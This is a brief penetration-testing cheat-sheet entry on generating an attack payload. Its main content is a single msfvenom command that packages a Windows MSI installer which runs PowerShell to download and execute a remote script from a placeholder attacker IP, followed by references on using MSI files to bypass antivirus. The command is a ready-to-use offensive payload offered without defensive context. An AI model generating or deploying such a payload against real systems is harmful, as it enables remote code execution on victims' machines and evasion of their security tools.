# Generating Attack Payload

## MSFvenom

    msfvenom -p windows/x64/exec CMD="cmd /c powershell iex(new-object net.webclient).downloadstring('http://<Attacker_IP>/shell.ps1')" -f msi > pwn.msi

## References

* https://pentestlab.blog/tag/msi/
* https://blog.netspi.com/bypassing-anti-virus-with-metasploit-msi-files/